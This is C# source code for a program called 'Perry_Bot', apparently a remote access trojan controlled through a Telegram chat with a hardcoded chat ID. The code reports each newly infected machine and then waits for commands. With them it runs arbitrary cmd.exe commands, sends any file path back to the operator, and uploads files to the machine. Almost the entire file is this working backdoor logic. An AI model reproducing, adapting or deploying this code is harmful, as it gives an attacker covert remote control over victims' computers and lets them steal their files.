using System;
using System.Text.Json;
using System.Threading;
using System.IO;
using System.Text.RegularExpressions;
using static Perry_Bot.Control;
using System.Linq;


namespace Perry_Bot
{
    class Program
    {
        private static int time_delay = 5;
        private static string chat_id= "-1002022566569";
        static string help = @"
Command:
/help - Help
/start - Hello Perry
/settime <seconds> - Set Time Response
/getfile <path> - Get File From Path
/upfile <path> - Upload File To Path
/exec <command> - Execute A Command via cmd.exe
";

        static void Main(string[] args)
        {
            run();

        }
        

        public static void run()
        {
            string tempPath = Path.GetTempPath();
            string folderName = "Perry";
            string folderPath = Path.Combine(tempPath, folderName);

            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
            }

            string threadIdFilePath = Path.Combine(folderPath, "threadid");
            string threadId;
            if (File.Exists(threadIdFilePath))
            {
                threadId = File.ReadAllText(threadIdFilePath);
            }
            else
            {
                threadId = createForumTopic(chat_id);
                File.WriteAllText(threadIdFilePath, threadId.ToString());
            }
            Message_thread_id = threadId;
            SendMessage(chat_id, "New Connected!", Whoami);

            while (true)
            {

                try
                {


                    string updateData = getUpdatesData();
                    JsonDocument data = JsonDocument.Parse(updateData);
                    long currentTime = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
                    
                    foreach (JsonElement result in data.RootElement.GetProperty("result").EnumerateArray())
                    {

                        long date = result.GetProperty("message").GetProperty("date").GetInt64();
                        
                        if (currentTime - date < time_delay)
                        {
                            string text;
                            string chatId = result.GetProperty("message").GetProperty("chat").GetProperty("id").GetInt64().ToString();
                            string mess_thread_id = result.GetProperty("message").GetProperty("message_thread_id").GetInt32().ToString();
                            if (chatId == chat_id && mess_thread_id == threadId)
                            {
                                string userId = result.GetProperty("message").GetProperty("from").GetProperty("id").GetInt64().ToString();
                                try
                                {
                                    text = result.GetProperty("message").GetProperty("text").GetString();
                                }
                                catch
                                {
                                    text = null;
                                }


                                if (text != null)
                                {
                                    if (Regex.IsMatch(text, @"^/help"))
                                    {

                                        SendMessage(chatId, "", help, format: false);
                                    }
                                    else if (Regex.IsMatch(text, @"^/start"))
                                        SendMessage(chatId, text, "CacCacCacCacCac``` [CCCC](https://i.imgur.com/NMek1jZ.gif) ```");
                                    else if (Regex.IsMatch(text, @"^/settime"))
                                    {
                                        int t = Int32.Parse(Regex.Replace(text, @"^/settime \s*", ""));
                                        time_delay = t;
                                        SendMessage(chatId, text, "OK");
                                        break;
                                    }
                                    else if (Regex.IsMatch(text, @"^/exec"))
                                    {
                                        string cmd = Regex.Replace(text, @"^/exec \s*", "");
                                        if (string.IsNullOrEmpty(cmd))
                                            cmd = "whoami";
                                        string resultText = ExecuteCommand(cmd);
                                        SendMessage(chatId, text, resultText);
                                    }
                                    else if (Regex.IsMatch(text, @"^/getfile"))
                                    {
                                        string filePath = text.Substring(9);
                                        if (filePath != null)
                                        {
                                            sendDocument(chatId, text, filePath);
                                        }
                                        else
                                        {
                                            SendMessage(chatId, text, "Error");
                                        }
                                    }

                                }
                                else
                                {
                                    string caption = result.GetProperty("message").GetProperty("caption").GetString();
                                    string savePath;
                                    if (Regex.IsMatch(text, @"^/upfile"))
                                    {
                                        try
                                        {
                                            savePath = caption.Substring(8);
                                            if (!File.Exists(savePath))
                                            {
                                                savePath = folderPath;
                                            }
                                        }
                                        catch (ArgumentOutOfRangeException)
                                        {
                                            savePath = folderPath;
                                        }
                                        string file_id = result.GetProperty("message").EnumerateObject().ElementAt(4).Value.EnumerateArray().Last().GetProperty("file_id").GetString();
                                        if (file_id != null)
                                        {
                                            string filename = upFile(file_id, savePath);
                                            SendMessage(chatId, caption, filename);
                                        }


                                    }

                                }
                            }
                            


                        }
                    }
                }
                catch (Exception e) {
                    Console.WriteLine (e.Message);
                    continue;
                }
                Thread.Sleep(time_delay*1000);
            }
        }

        
    }
}